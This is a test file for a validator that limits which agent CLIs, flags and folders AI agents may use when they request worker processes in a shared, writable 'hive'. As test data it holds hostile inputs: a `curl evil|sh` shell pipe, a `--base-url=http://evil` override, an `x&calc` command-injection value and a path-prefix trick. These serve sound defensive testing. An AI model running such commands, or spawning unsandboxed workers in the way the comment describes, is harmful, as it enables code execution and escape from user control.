'use strict';
// A worker spawn request is a file any agent can write (the hive is writable to
// all of them, and nothing sandboxes agents on Windows). It used to be able to
// name ANY executable (`bash -c 'curl …|sh'`), with any flags, in any folder,
// and the app ran it unsandboxed with a broker token. Now: agent CLIs only, no
// flags that change settings/MCP/backend, and only folders the user set up.
const test = require('node:test');
const assert = require('node:assert/strict');
const loadTs = require('./load-ts.cjs');

const { workerRequestProblem } = loadTs('src/main/workerLaunch.ts');

const allow = { bins: ['claude', 'codex', 'agy'], roots: ['/home/u/repo', '/home/u/office'] };

test('an agent CLI in a registered repo is allowed', () => {
  assert.equal(workerRequestProblem({ bin: 'claude', args: ['--model', 'opus', '--permission-mode', 'bypassPermissions'] }, '/home/u/repo', allow), null);
  assert.equal(workerRequestProblem({ bin: '/usr/local/bin/codex', args: [] }, '/home/u/repo/sub/dir', allow), null);
  assert.equal(workerRequestProblem({ bin: 'C:\\Users\\u\\AppData\\Roaming\\npm\\claude.cmd', args: [] }, 'C:\\Repo', { bins: ['claude'], roots: ['c:\\repo'], caseInsensitive: true }), null);
});

test('a shell, an interpreter or any other program is refused', () => {
  for (const bin of ['bash', 'sh', 'node', 'powershell', 'cmd', '/bin/bash', 'python3', 'env']) {
    assert.match(workerRequestProblem({ bin, args: ['-c', 'curl evil|sh'] }, '/home/u/repo', allow), /not an agent CLI/, bin);
  }
});

test('flags that change settings, MCP, dirs or the backend are refused', () => {
  for (const f of ['--settings', '--mcp-config=x.json', '--add-dir', '-c', '--config', '--provider', '--base-url=http://evil']) {
    assert.match(workerRequestProblem({ bin: 'claude', args: [f, 'x'] }, '/home/u/repo', allow), /not allowed/, f);
  }
  assert.match(workerRequestProblem({ bin: 'claude', args: ['--model', 'x&calc'] }, '/home/u/repo', allow), /characters/);
});

test('a folder outside the repos, the office and the agents is refused', () => {
  assert.match(workerRequestProblem({ bin: 'claude', args: [] }, '/', allow), /not a registered repo/);
  assert.match(workerRequestProblem({ bin: 'claude', args: [] }, '/home/u/repo-evil', allow), /not a registered repo/, 'a sibling with the same prefix is not inside');
  assert.match(workerRequestProblem({ bin: 'claude', args: [] }, '/home/u', allow), /not a registered repo/);
});
